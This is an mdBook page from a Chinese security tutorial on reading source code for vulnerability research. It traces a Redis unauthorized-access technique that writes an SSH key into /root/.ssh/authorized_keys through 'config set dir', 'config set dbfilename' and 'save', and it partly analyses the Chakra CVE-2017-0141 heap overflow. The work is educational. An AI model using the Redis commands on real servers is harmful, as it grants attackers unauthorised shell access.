@@ -1,0 +1,1006 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Source Code - Source and Fuzzing</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="The example book covers examples.">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="./theme/custom.css">
+        <link rel="stylesheet" href="theme/pagetoc.css">
+        <link rel="stylesheet" href="./theme/catppuccin.css">
+        <link rel="stylesheet" href="./theme/catppuccin-highlight.css">
+
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="1.Github.html"><strong aria-hidden="true">1.</strong> Github</a></li><li class="chapter-item expanded "><a href="11.AI.html"><strong aria-hidden="true">2.</strong> Ai</a></li><li class="chapter-item expanded "><a href="12.libfuzzer-asan.html"><strong aria-hidden="true">3.</strong> Libfuzzer Asan</a></li><li class="chapter-item expanded "><a href="2.Fuzzing.html"><strong aria-hidden="true">4.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="3.Fuzzing.html"><strong aria-hidden="true">5.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="4.source-code.html" class="active"><strong aria-hidden="true">6.</strong> Source Code</a></li><li class="chapter-item expanded "><a href="5.compile.html"><strong aria-hidden="true">7.</strong> Compile</a></li><li class="chapter-item expanded "><a href="6.static-analysis.html"><strong aria-hidden="true">8.</strong> Static Analysis</a></li><li class="chapter-item expanded "><a href="7.dynamic-analysis.html"><strong aria-hidden="true">9.</strong> Dynamic Analysis</a></li><li class="chapter-item expanded "><a href="8.llvm.html"><strong aria-hidden="true">10.</strong> Llvm</a></li><li class="chapter-item expanded "><a href="9.klee.html"><strong aria-hidden="true">11.</strong> Klee</a></li><li class="chapter-item expanded "><a href="chapter_1.html"><strong aria-hidden="true">12.</strong> Chapter 1</a></li><li class="chapter-item expanded "><a href="#.html"><strong aria-hidden="true">13.</strong> Libfuzzer Asan</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan.html"><strong aria-hidden="true">13.1.</strong> 深入解析libfuzzer与asan</a></li><li class="chapter-item expanded "><a href="#.html"><strong aria-hidden="true">13.2.</strong> 深入解析libfuzzer与asan</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan/ASAN原理.html"><strong aria-hidden="true">13.2.1.</strong> Asan原理</a></li><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan/LLVM下的插桩简述.html"><strong aria-hidden="true">13.2.2.</strong> Llvm下的插桩简述</a></li><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan/libFuzzer原理.html"><strong aria-hidden="true">13.2.3.</strong> libFuzzer原理</a></li><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan/参考引用.html"><strong aria-hidden="true">13.2.4.</strong> 参考引用</a></li><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan/实战中ASAN会有哪些坑.html"><strong aria-hidden="true">13.2.5.</strong> 实战中asan会有哪些坑</a></li><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan/深入解析libFuzzer参数与回显.html"><strong aria-hidden="true">13.2.6.</strong> 深入解析libFuzzer参数与回显</a></li><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan/玩转Sanitizer-Coverage.html"><strong aria-hidden="true">13.2.7.</strong> 玩转Sanitizer Coverage</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="#.html"><strong aria-hidden="true">14.</strong> Static Analysis</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="6.static-analysis/静态程序分析原理.html"><strong aria-hidden="true">14.1.</strong> 静态程序分析原理</a></li><li class="chapter-item expanded "><a href="#.html"><strong aria-hidden="true">14.2.</strong> 静态程序分析原理</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="6.static-analysis/静态程序分析原理/必备工具.html"><strong aria-hidden="true">14.2.1.</strong> 必备工具</a></li><li class="chapter-item expanded "><a href="6.static-analysis/静态程序分析原理/附录一--各图的Graphiz生成代码.html"><strong aria-hidden="true">14.2.2.</strong> 附录一  各图的Graphiz生成代码</a></li><li class="chapter-item expanded "><a href="6.static-analysis/静态程序分析原理/附录二--静态审计工具完整源码.html"><strong aria-hidden="true">14.2.3.</strong> 附录二  静态审计工具完整源码</a></li><li class="chapter-item expanded "><a href="6.static-analysis/静态程序分析原理/静态代码分析基本原理.html"><strong aria-hidden="true">14.2.4.</strong> 静态代码分析基本原理</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="#.html"><strong aria-hidden="true">15.</strong> Dynamic Analysis</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="7.dynamic-analysis/动态程序分析原理.html"><strong aria-hidden="true">15.1.</strong> 动态程序分析原理</a></li><li class="chapter-item expanded "><a href="#.html"><strong aria-hidden="true">15.2.</strong> 动态程序分析原理</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="7.dynamic-analysis/动态程序分析原理/内存监控.html"><strong aria-hidden="true">15.2.1.</strong> 内存监控</a></li><li class="chapter-item expanded "><a href="7.dynamic-analysis/动态程序分析原理/动态代码分析基本原理.html"><strong aria-hidden="true">15.2.2.</strong> 动态代码分析基本原理</a></li><li class="chapter-item expanded "><a href="7.dynamic-analysis/动态程序分析原理/必备工具.html"><strong aria-hidden="true">15.2.3.</strong> 必备工具</a></li><li class="chapter-item expanded "><a href="7.dynamic-analysis/动态程序分析原理/污点追踪.html"><strong aria-hidden="true">15.2.4.</strong> 污点追踪</a></li><li class="chapter-item expanded "><a href="7.dynamic-analysis/动态程序分析原理/程序插桩与代码覆盖率.html"><strong aria-hidden="true">15.2.5.</strong> 程序插桩与代码覆盖率</a></li><li class="chapter-item expanded "><a href="7.dynamic-analysis/动态程序分析原理/符号执行.html"><strong aria-hidden="true">15.2.6.</strong> 符号执行</a></li></ol></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Source and Fuzzing</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main><div class="sidetoc"><nav class="pagetoc"></nav></div>
+                        <h1 id="6-阅读源码"><a class="header" href="#6-阅读源码">6. 阅读源码</a></h1>
+<ul>
+<li><a href="#%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7">必备工具</a></li>
+<li><a href="#%E4%BB%8E%E4%B8%80%E4%B8%AA%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E5%88%B0%E6%BA%90%E7%A0%81%E5%B1%82%E4%B8%8A%E7%9A%84%E7%90%86%E8%A7%A3">从一个利用思路到源码层上的理解</a></li>
+<li><a href="#%E4%BB%8E%E4%B8%80%E4%B8%AA%E6%BC%8F%E6%B4%9Ecommit-%E5%88%B0%E7%90%86%E8%A7%A3%E8%BF%99%E4%B8%80%E7%B1%BB%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E5%BC%8F">从一个漏洞Commit 到理解这一类的漏洞挖掘方式</a></li>
+<li><a href="#%E7%BB%93%E5%90%88poc-%E5%92%8C%E6%BA%90%E7%A0%81%E6%9D%A5%E7%90%86%E8%A7%A3%E8%BF%99%E7%B1%BB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86">结合PoC 和源码来理解这类漏洞的原理</a></li>
+<li><a href="#%E7%BB%93%E5%B0%BE">结尾</a></li>
+</ul>
+<p>读代码要带有目的去读,是要挖漏洞还是想要了解这个程序到在底干了些什么</p>
+<p>要理解整体的时候,千万不要在某个细节里钻牛角尖</p>
+<p>要一边理解细节一边挖洞的时候,记得要联想到所有可能的情况</p>
+<h2 id="必备工具"><a class="header" href="#必备工具">必备工具</a></h2>
+<p>Source Insight ,redis 源码,VS2017 ,Chakra 源码 ,Struts2 源码</p>
+<h2 id="从一个利用思路到源码层上的理解"><a class="header" href="#从一个利用思路到源码层上的理解">从一个利用思路到源码层上的理解</a></h2>
+<p>本节从一个redis 提权思路开始一步步分析,原文地址:https://www.huangdc.com/443 .这篇文章主要说的是,找到了未授权的redis 然后使用<code>config</code> 命令进行ssh key 的替换,使得攻击者可以使用ssh 免密码登陆的方式 直接getshell .我们看看文章里的关键部分</p>
+<pre><code class="language-bash">
+    [root@vm200-78 ~]# cat mypubkey.txt |redis-cli -h 192.168.203.224 -p 4700 -x set mypubkey
+    OK
+    [root@vm200-78 ~]# redis-cli -h 192.168.203.224 -p 4700
+    redis 192.168.203.224:4700&gt; config set dir /root/.ssh/
+    OK
+    redis 192.168.203.224:4700&gt; config set dbfilename &quot;authorized_keys&quot;
+    OK
+    redis 192.168.203.224:4700&gt; save
+    OK
+    redis 192.168.203.224:4700&gt;
+
+</code></pre>
+<p>把mypubkey.txt 的内容写入到了mypubkey 之后,然后使用<code>config set dir</code> 改变数据保存目录,再使用<code>config set dbfilename &quot;authorized_keys&quot;</code> 改变数据保存文件名,接下来使用<code>save</code> 进行数据保存,把ssh key 保存到/root/.ssh 中,下载好redis 的源码,我们来探索一下</p>
+<p>这个命令叫config ,那么我们到Github 上来搜索有config 的地方</p>
+<p><img src="pic4/github_find_config.png" alt="" /></p>
+<p><img src="pic4/github_find_config1.png" alt="" /></p>
+<p>有config 字符串的地方太多了,我们换一个来搜索,找save 命令</p>
+<p><img src="pic4/github_find_save.png" alt="" /></p>
+<p><img src="pic4/github_find_save1.png" alt="" /></p>
+<p>搜索save 的结果不是很多,在第二页就可以找到所有命令的声名了</p>
+<p><img src="pic4/github_find_save2.png" alt="" /></p>
+<p>接下来我们来看看<code>src/server.c</code> 的代码,搜索saveCommand</p>
+<p><img src="pic4/github_find_save3.png" alt="" /></p>
+<p>现在可以进一步确定这个地方是命令声名的地方,<code>save</code> 是命令的字符串,<code>saveCommand</code> 是命令的入口点,那么我们搜索<code>config</code></p>
+<p><img src="pic4/github_find_config2.png" alt="" /></p>
+<p>现在能够定位到<code>config</code> 命令的入口函数了,继续搜索configCommand</p>
+<p><img src="pic4/github_find_config3.png" alt="" /></p>
+<p>定位到configCommand 函数在<code>src/config.c</code> ,进去源码文件继续查找</p>
+<p><img src="pic4/github_find_config4.png" alt="" /></p>
+<p>找到configCommand ,源码如下:</p>
+<pre><code class="language-c">
+    void configCommand(client *c) {
+        /* Only allow CONFIG GET while loading. */
+        if (server.loading &amp;&amp; strcasecmp(c-&gt;argv[1]-&gt;ptr,&quot;get&quot;)) {
+            addReplyError(c,&quot;Only CONFIG GET is allowed during loading&quot;);
+            return;
+        }
+
+        if (c-&gt;argc == 2 &amp;&amp; !strcasecmp(c-&gt;argv[1]-&gt;ptr,&quot;help&quot;)) {
+            const char *help[] = {
+                &quot;get &lt;pattern&gt; -- Return parameters matching the glob-like &lt;pattern&gt; and their values.&quot;,
+                &quot;set &lt;parameter&gt; &lt;value&gt; -- Set parameter to value.&quot;,
+                &quot;resetstat -- Reset statistics reported by INFO.&quot;,
+                &quot;rewrite -- Rewrite the configuration file.&quot;,
+                NULL
+            };
+            addReplyHelp(c, help);
+        } else if (!strcasecmp(c-&gt;argv[1]-&gt;ptr,&quot;set&quot;) &amp;&amp; c-&gt;argc == 4) {  //  注意这里,config set 命令
+            configSetCommand(c);
+        } else if (!strcasecmp(c-&gt;argv[1]-&gt;ptr,&quot;get&quot;) &amp;&amp; c-&gt;argc == 3) {
+            configGetCommand(c);
+        } else if (!strcasecmp(c-&gt;argv[1]-&gt;ptr,&quot;resetstat&quot;) &amp;&amp; c-&gt;argc == 2) {
+            resetServerStats();
+            resetCommandTableStats();
+            addReply(c,shared.ok);
+        } else if (!strcasecmp(c-&gt;argv[1]-&gt;ptr,&quot;rewrite&quot;) &amp;&amp; c-&gt;argc == 2) {
+            if (server.configfile == NULL) {
+                addReplyError(c,&quot;The server is running without a config file&quot;);
+                return;
+            }
+            if (rewriteConfig(server.configfile) == -1) {
+                serverLog(LL_WARNING,&quot;CONFIG REWRITE failed: %s&quot;, strerror(errno));
+                addReplyErrorFormat(c,&quot;Rewriting config file: %s&quot;, strerror(errno));
+            } else {
+                serverLog(LL_WARNING,&quot;CONFIG REWRITE executed with success.&quot;);
+                addReply(c,shared.ok);
+            }
+        } else {
+             addReplyErrorFormat(c, &quot;Unknown subcommand or wrong number of arguments for '%s'. Try CONFIG HELP&quot;,
+                (char*)c-&gt;argv[1]-&gt;ptr);
+            return;
+        }
+    }
+
+</code></pre>
+<p>继续对<code>configSetCommand()</code> 函数进行跟踪,在<code>src/config.c:837</code> 行代码,由于代码量比较多,在此挑选一些比较重点的地方来说</p>
+<pre><code class="language-c">
+    void configSetCommand(client *c) {
+        robj *o;
+        long long ll;
+        int err;
+        serverAssertWithInfo(c,c-&gt;argv[2],sdsEncodedObject(c-&gt;argv[2]));
+        serverAssertWithInfo(c,c-&gt;argv[3],sdsEncodedObject(c-&gt;argv[3]));
+        o = c-&gt;argv[3];
+
+        if (0) { /* this starts the config_set macros else-if chain. */
+
+        /* Special fields that can't be handled with general macros. */
+        config_set_special_field(&quot;dbfilename&quot;) {  //  命令config set dbfilename
+            if (!pathIsBaseName(o-&gt;ptr)) {  //
+                addReplyError(c, &quot;dbfilename can't be a path, just a filename&quot;);
+                return;
+            }
+            zfree(server.rdb_filename);
+            server.rdb_filename = zstrdup(o-&gt;ptr);
+
+        //  ...
+
+        } config_set_special_field(&quot;dir&quot;) {  //  命令config set dir
+            if (chdir((char*)o-&gt;ptr) == -1) {
+                addReplyErrorFormat(c,&quot;Changing directory: %s&quot;, strerror(errno));
+                return;
+            }
+        }
+
+        //  ...
+    }
+
+</code></pre>
+<p><code>config set dir</code> 这个命令很好理解,就是改变当前运行目录路径.<code>config set dbfilename</code> 则是设置redis 服务器的rdb_filename 字段.明白了<code>config set</code> 的工作原理之后,回来再看看<code>save</code> 命令.使用上面的方法找到<code>saveCommand()</code> 函数,在<code>src/rdb.c:2073</code> 行.</p>
+<pre><code class="language-c">
+    void saveCommand(client *c) {
+        if (server.rdb_child_pid != -1) {
+            addReplyError(c,&quot;Background save already in progress&quot;);
+            return;
+        }
+        rdbSaveInfo rsi, *rsiptr;
+        rsiptr = rdbPopulateSaveInfo(&amp;rsi);
+        if (rdbSave(server.rdb_filename,rsiptr) == C_OK) {
+            addReply(c,shared.ok);
+        } else {
+            addReply(c,shared.err);
+        }
+    }
+
+</code></pre>
+<p>我们再来找找<code>rdbSave()</code> 函数.<code>CTRL + F</code> 搜素一下有没有在当前的代码文件里.</p>
+<p><img src="pic4/github_find_rdbsave.png" alt="" /></p>
+<p>同一个文件上有很多rdbSave 的关键字,我们要找的是函数声明,那么加上一个<code>(</code> 符号,搜素字符串<code>rdbSave(</code></p>
+<p><img src="pic4/github_find_rdbsave1.png" alt="" /></p>
+<p>这样搜素出来的结果就少很多,往上找一找,就能够直接定位到<code>rdbSave()</code> 函数,在<code>src/rdb.c:1042</code> 行</p>
+<pre><code class="language-c">
+    /* Save the DB on disk. Return C_ERR on error, C_OK on success. */
+    int rdbSave(char *filename, rdbSaveInfo *rsi) {
+        char tmpfile[256];
+        char cwd[MAXPATHLEN]; /* Current working dir path for error messages. */
+        FILE *fp;
+        rio rdb;
+        int error = 0;
+
+        snprintf(tmpfile,256,&quot;temp-%d.rdb&quot;, (int) getpid());  //  生成一个临时文件名
+        fp = fopen(tmpfile,&quot;w&quot;);  //  创建文件
+        if (!fp) {
+            char *cwdp = getcwd(cwd,MAXPATHLEN);
+            serverLog(LL_WARNING,
+                &quot;Failed opening the RDB file %s (in server root dir %s) &quot;
+                &quot;for saving: %s&quot;,
+                filename,
+                cwdp ? cwdp : &quot;unknown&quot;,
+                strerror(errno));
+            return C_ERR;
+        }
+
+        rioInitWithFile(&amp;rdb,fp);
+        if (rdbSaveRio(&amp;rdb,&amp;error,RDB_SAVE_NONE,rsi) == C_ERR) {  //  保存数据到文件
+            errno = error;
+            goto werr;
+        }
+
+        /* Make sure data will not remain on the OS's output buffers */
+        if (fflush(fp) == EOF) goto werr;
+        if (fsync(fileno(fp)) == -1) goto werr;
+        if (fclose(fp) == EOF) goto werr;  //  关闭文件
+
+        /* Use RENAME to make sure the DB file is changed atomically only
+         * if the generate DB file is ok. */
+        if (rename(tmpfile,filename) == -1) {  //  重命名文件
+            char *cwdp = getcwd(cwd,MAXPATHLEN);
+            serverLog(LL_WARNING,
+                &quot;Error moving temp DB file %s on the final &quot;
+                &quot;destination %s (in server root dir %s): %s&quot;,
+                tmpfile,
+                filename,
+                cwdp ? cwdp : &quot;unknown&quot;,
+                strerror(errno));
+            unlink(tmpfile);
+            return C_ERR;
+        }
+
+        serverLog(LL_NOTICE,&quot;DB saved on disk&quot;);
+        server.dirty = 0;
+        server.lastsave = time(NULL);
+        server.lastbgsave_status = C_OK;
+        return C_OK;
+
+    werr:
+        serverLog(LL_WARNING,&quot;Write error saving DB on disk: %s&quot;, strerror(errno));
+        fclose(fp);
+        unlink(tmpfile);
+        return C_ERR;
+    }
+
+</code></pre>
+<p>看完了上面的代码之后,我们知道:fopen 会在当前目录下生成一个临时文件来保存数据,那么通过<code>config set dir</code> 改变目录到<code>/root/.ssh/</code> ,<code>fopen()</code> 函数就会在<code>/root/.ssh/</code> 目录下生成文件.我们来看看<code>rdbSave()</code> 函数重命名文件部分的代码</p>
+<pre><code class="language-c">
+    if (rename(tmpfile,filename) == -1) {  //  重命名文件
+        char *cwdp = getcwd(cwd,MAXPATHLEN);
+
+        // ...
+
+        unlink(tmpfile);
+        return C_ERR;
+    }
+
+</code></pre>
+<p>filename 是rdbSave 函数的参数</p>
+<pre><code class="language-c">
+    /* Save the DB on disk. Return C_ERR on error, C_OK on success. */
+    int rdbSave(char *filename, rdbSaveInfo *rsi) {
+
+</code></pre>
+<p>然后回去看<code>saveCommand()</code> 的源码,filename 其实是server.rdb_filename</p>
+<pre><code class="language-c">
+    if (rdbSave(server.rdb_filename,rsiptr) == C_OK) {
+
+</code></pre>
+<h2 id="从一个漏洞commit-到理解这一类的漏洞挖掘方式"><a class="header" href="#从一个漏洞commit-到理解这一类的漏洞挖掘方式">从一个漏洞Commit 到理解这一类的漏洞挖掘方式</a></h2>
+<p>本节从一个Chakra 的Bug Commit : [CVE-2017-0141] ReverseHelper Heap Overflow ,Link https://github.com/Microsoft/ChakraCore/commit/db504eba489528434dfb56257b0f202209741fe9 .和读者们分享一下如何从阅读源码的层面上对JavaScript 的OOB 漏洞挖掘的一些思路.</p>
+<p><img src="pic4/reversehelper_commit.png" alt="" /></p>
+<p>看到diff 知道代码修复的位置,现在我们到Source Insight 里面找找.找到这个按钮</p>
+<p><img src="pic4/function_list.png" alt="" /></p>
+<p>现在在搜素里面找ReverseHelper ,Source Insight 能找到这个函数</p>
+<p><img src="pic4/function_list2.png" alt="" /></p>
+<p>双击这里之后,就跳到了ReverseHelper ,我们在看看函数列表这里</p>
+<p><img src="pic4/function_list1.png" alt="" /></p>
+<p>是不是看到了很多其他的函数,这些函数就是Chakra 的JavaScript 内部对象的实现函数.要触发ReverseHelper 函数的调用,可以构造如下的代码.</p>
+<pre><code class="language-javascript">
+    data = Array();
+
+    data.reverse();
+
+</code></pre>
+<p>注意,<strong>Chakra 是在底层上实现内部对象函数的,V8 是在Native JavaScript 上实现内部对象函数的</strong>.</p>
+<p>让我们回来继续分析漏洞成因.由于代码一直有变化,patch 了的代码和原来Commit 的位置已经不同了,不过没有关系,能定位到就好.</p>
+<p><img src="pic4/reversehelper_commit1.png" alt="" /></p>
+<p>pArr 到底是什么东西呢,我们来查看它的定义</p>
+<p><img src="pic4/find_parr.png" alt="" /></p>
+<p><img src="pic4/find_parr1.png" alt="" /></p>
+<p><code>ReverseHelper()</code> 的声明如下:</p>
+<pre><code class="language-c++">
+    Var JavascriptArray::ReverseHelper(JavascriptArray* pArr, Js::TypedArrayBase* typedArrayBase, RecyclableObject* obj, T length, ScriptContext* scriptContext)
+
+</code></pre>
+<p>现在我们找到了pArr 和length 的来源了.来看看<code>ReverseHelper()</code> 被哪些地方引用到</p>
+<p><img src="pic4/reversehelper_references.png" alt="" /></p>
+<pre><code>
+    JavascriptArray.cpp (lib\runtime\library):            JS_REENTRANT_UNLOCK(jsReentLock, return JavascriptArray::ReverseHelper(pArr, nullptr, obj, length.GetSmallIndex(), scriptContext));
+    JavascriptArray.cpp (lib\runtime\library):        JS_REENTRANT_UNLOCK(jsReentLock, return JavascriptArray::ReverseHelper(pArr, nullptr, obj, length.GetBigIndex(), scriptContext));
+    JavascriptArray.cpp (lib\runtime\library):    Var JavascriptArray::ReverseHelper(JavascriptArray* pArr, Js::TypedArrayBase* typedArrayBase, RecyclableObject* obj, T length, ScriptContext* scriptContext)
+    JavascriptArray.h (lib\runtime\library):        static Var ReverseHelper(JavascriptArray* pArr, Js::TypedArrayBase* typedArrayBase, RecyclableObject* obj, T length, ScriptContext* scriptContext);
+    TypedArray.cpp (lib\runtime\library):        return JavascriptArray::ReverseHelper(nullptr, typedArrayBase, typedArrayBase, typedArrayBase-&gt;GetLength(), scriptContext);
+
+</code></pre>
+<p>我们搜素当前的源码文件的那两个引用.最后定位到<code>JavascriptArray::EntryReverse()</code></p>
+<pre><code class="language-c++">
+    Var JavascriptArray::EntryReverse(RecyclableObject* function, CallInfo callInfo, ...)  //  在Chakra 中,内部对象处理函数都长这样
+    /*
+      注意:Chakra 的内部函数调用原理是这样的:callInfo 传递给函数调用的参数列表.里面包含了当前对象和函数参数对象列表,callInfo[0] 是当前对象,callInfo[1] 往后就是函数参数列表
+    */
+    {
+        PROBE_STACK(function-&gt;GetScriptContext(), Js::Constants::MinStackDefault);
+
+        ARGUMENTS(args, callInfo);  //  格式化callInfo 成args
+        ScriptContext* scriptContext = function-&gt;GetScriptContext();
+        JS_REENTRANCY_LOCK(jsReentLock, scriptContext-&gt;GetThreadContext());
+
+        Assert(!(callInfo.Flags &amp; CallFlags_New));
+
+        if (args.Info.Count == 0)  //  无法获取当前的Array 对象
+        {
+            JavascriptError::ThrowTypeError(scriptContext, JSERR_This_NullOrUndefined, _u(&quot;Array.prototype.reverse&quot;));
+        }
+
+        BigIndex length = 0u;  //  注意,这个就是传递到ReverseHelper() 的length
+        JavascriptArray* pArr = nullptr;
+        RecyclableObject* obj = nullptr;
+
+        JS_REENTRANT(jsReentLock, TryGetArrayAndLength(args[0], scriptContext, _u(&quot;Array.prototype.reverse&quot;), &amp;pArr, &amp;obj, &amp;length));  //  从当前的Array 对象中获取信息,其中包含了数组长度,Array 指针
+
+        if (length.IsSmallIndex())
+        {
+            JS_REENTRANT_UNLOCK(jsReentLock, return JavascriptArray::ReverseHelper(pArr, nullptr, obj, length.GetSmallIndex(), scriptContext));  //  调用ReverseHelper
+        }
+        Assert(pArr == nullptr || length.IsUint32Max()); // if pArr is not null lets make sure length is safe to cast, which will only happen if length is a uint32max
+
+        JS_REENTRANT_UNLOCK(jsReentLock, return JavascriptArray::ReverseHelper(pArr, nullptr, obj, length.GetBigIndex(), scriptContext));  //  调用ReverseHelper
+    }
+
+</code></pre>
+<p>再来看看<code>TryGetArrayAndLength()</code> 做了些什么</p>
+<pre><code class="language-c++">
+    template&lt;typename T&gt;
+    void JavascriptArray::TryGetArrayAndLength(Var arg,
+        ScriptContext *scriptContext,
+        PCWSTR methodName,
+        __out JavascriptArray** array,
+        __out RecyclableObject** obj,
+        __out T * length)
+    {
+        Assert(array != nullptr);
+        Assert(obj != nullptr);
+        Assert(length != nullptr);
+
+        *array = JavascriptOperators::TryFromVar&lt;JavascriptArray&gt;(arg);
+        if (*array &amp;&amp; !(*array)-&gt;IsCrossSiteObject())  //  判断Array 是否为跨站对象
+        {
+            #if ENABLE_COPYONACCESS_ARRAY
+                JavascriptLibrary::CheckAndConvertCopyOnAccessNativeIntArray&lt;Var&gt;(*array);
+            #endif
+
+            *obj = *array;
+            *length = (*array)-&gt;length;  //  返回的长度为真实的数组长度
+        }
+        else
+        {
+            if (!JavascriptConversion::ToObject(arg, scriptContext, obj))
+            {
+                JavascriptError::ThrowTypeError(scriptContext, JSERR_This_NullOrUndefined, methodName);
+            }
+            *length = OP_GetLength(*obj, scriptContext);  //  返回的长度为JavaScript 属性length 设置的值
+            *array = nullptr;
+        }
+    }
+
+</code></pre>
+<p><code>IsCrossSiteObject()</code> 到底做了什么工作呢?读者可以自行搜素代码来阅读.</p>
+<p><img src="pic4/cross_site_object.png" alt="" /></p>
+<p>相信读者开始有一个疑问,<code>*length = (*array)-&gt;length;</code> 和<code>*length = OP_GetLength(*obj, scriptContext);</code> 到底有什么不同呢?<strong>理解它们两个差异,就可以理解JavaScript 关于数组越界的漏洞的成因</strong>.让我们再深入去了解它们背后的故事.</p>
+<pre><code class="language-c++">
+    class ArrayObject : public DynamicObject  //  lib/runtime/types/ArrayObject.h:18
+    {
+    protected:
+        Field(uint32) length;
+
+
+    class JavascriptArray : public ArrayObject  //  lib/runtime/library/JavascriptArray.h:94
+    {
+
+</code></pre>
